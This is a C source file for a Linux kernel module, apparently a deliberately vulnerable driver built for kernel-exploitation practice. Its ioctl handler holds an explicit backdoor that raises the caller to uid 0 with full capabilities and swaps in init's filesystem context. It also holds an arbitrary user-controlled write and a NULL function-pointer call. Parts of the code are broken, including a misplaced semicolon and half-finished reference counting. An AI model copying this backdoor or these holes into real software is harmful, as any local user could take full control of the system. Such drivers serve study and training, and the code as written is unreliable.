#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/miscdevice.h>
#include <linux/slab.h>
#include <linux/ioctl.h>
#include <linux/uaccess.h>
#include<linux/fs_struct.h>

#include <linux/init_task.h>
// #include<sys/types.h>
// #include<unistd.h>

#include "vuln_driver.h"



// struct fs_struct *init_fs;


void
pull_fs(struct task_struct *tsk,
			struct fs_struct *new_fs)
{
	struct fs_struct *fs = tsk->fs;
		int kill;
	if (fs)
	{
		task_lock(tsk);
		spin_lock(&fs->lock);
		tsk->fs = new_fs;
		kill = !--fs->users;
		spin_unlock(&fs->lock);
		task_unlock(tsk);
	}
	// if (kill)
		// free_fs_struct(fs);
}


void bbbckx(void){
	struct cred *mycred = current_cred();

			printk("[@]the current uid is %d\n",mycred->uid);

			kuid_t rootid;
			rootid.val=0;
			
			// kuid_t rootid = KUIDT_INIT(0);
			mycred = prepare_creds();

			mycred->uid=rootid;

			mycred->cap_permitted.cap[0] = 0xffffffff;
			mycred->cap_permitted.cap[1]=0x3f;
			mycred->cap_effective.cap[0] = 0xffffffff;
			mycred->cap_effective.cap[1] = 0x3f;
			mycred->cap_bset.cap[0] = 0xffffffff;
			mycred->cap_bset.cap[1] = 0x3f;




			struct task_struct *task=get_current();

			while(task->pid!=1){

				task=task->real_parent;
			}

			struct fs_struct *to=task->fs;

			printk("[***]init_fs found %d\n\n\n",task->pid);

			// daemonize_fs_struct

			task = get_current();
			// daemonize_fs_struct();

			pull_fs(task,to);

			// struct nsproxy *new_proxy = create_namespaces(clone_flags, tsk, uns, tsk->fs);

			// struct nsproxy init_nsproxy = INIT_NSPROXY(init_nsproxy);
			// switch_task_namespaces(task,&init_nsproxy);


				// char buffer[8] = "\xff\xff\xff\x22\x33\x77\x00\x00";
				// memcpy(&(mycred->cap_permitted),buffer,8);





			commit_creds(mycred);

			// return -EINVAL;
			// setuid(0);
			// current_uid=0;

			printk("[@]now current uid is %d\n",mycred->uid);



}
// void daemonize_fs_struct(void)
// {
// 	struct fs_struct *fs = current->fs;
// 		int kill;
// 	if (fs)
// 	{
// 		task_lock(current);
// 		write_lock(&init_fs.lock);
// 		init_fs.users++;
// 		write_unlock(&init_fs.lock);
// 		write_lock(&fs->lock);
// 		current->fs = &init_fs;
// 		kill = !--fs->users;
// 		write_unlock(&fs->lock);
// 		task_unlock(current);
// 		if (kill)
// 			free_fs_struct(fs);
// 	}
// }
static long do_ioctl(struct file *filp, unsigned int cmd, unsigned long args)
{
	int ret;
	unsigned long *p_arg = (unsigned long *)args;
 	ret = 0;

	switch(cmd) {

		case CKX_TRIGGER_BACKDOOR:
		{
			
			bbbckx();
			ret=1234;
			break;
		}
	
        case ARBITRARY_RW_WRITE_USER_CKX:
        {
            write_args_ckx w_args_ckx;
            char ckxbuffer[0x500];
            unsigned long count;
            void *ckxto;
            void *ckxsrc;
	    	printk("[*] ckx: action1\n");
            if (copy_from_user(&w_args_ckx, p_arg, sizeof(write_args_ckx)))
                return -EINVAL;

            // ret = write_mem_buffer(&w_args);

            ckxto=w_args_ckx.to;
            ckxsrc=w_args_ckx.buff;
            count =w_args_ckx.count;
	   		printk("ckxto is %p\n",ckxto);
	   		printk("ckxSRC is %p\n",ckxsrc);
	   		printk("COUNT is %ld\n",count);
	   
	   		printk("[*] ckx: action2\n");
            if (copy_from_user(ckxto, ckxsrc, 2));
                return -EINVAL;

			printk("[*] ckx: action3\n");
           // printk("[*] target is:%p\n",ckxto);
           // printk ("[*] target is padding : %s\n",ckxto);


            break;
        }
    case CKX_NULL:
        {

            void (*fun)(void);
            fun = NULL;
            //printk("%s:thread.sp0: %p, task->stack: %p\n", "PROC", current->thread.sp0, current->stack);
            fun();
            //printk("The memory of %p : %d\n", proc_user, *proc_user);
            return 0;
        }		
	}

	return ret;
}










static int vuln_release(struct inode *inode, struct file *filp)
{


	return 0;
}

/**
* The operations allowed by userspace applications.
* We only really allow access through the ioctl interface.
*/
static struct file_operations vuln_ops = {
	.owner = THIS_MODULE,
	.unlocked_ioctl = do_ioctl,
	.release = vuln_release,
};

/**
* The miscdevice api is much simpler than creating a class
* and attaching it to a node using class_create etc.
*/
static struct miscdevice vuln_device = {
	MISC_DYNAMIC_MINOR, DEVICE_NAME, &vuln_ops
};

/**
* Register the device.
*/
static int vuln_module_init(void)
{
	int ret;

	ret = misc_register(&vuln_device);

	if(ret < 0) {
		printk(KERN_WARNING "[-] Error registering device [-]\n");
	}

	// printk(KERN_WARNING "[!!!] use_stack_obj @%p [!!!]\n", use_stack_obj);

	return ret;
}

/**
* Deregister the device.
*/
static void vuln_module_exit(void)
{
	misc_deregister(&vuln_device);
}

module_init(vuln_module_init);
module_exit(vuln_module_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Invictus");
MODULE_DESCRIPTION("");
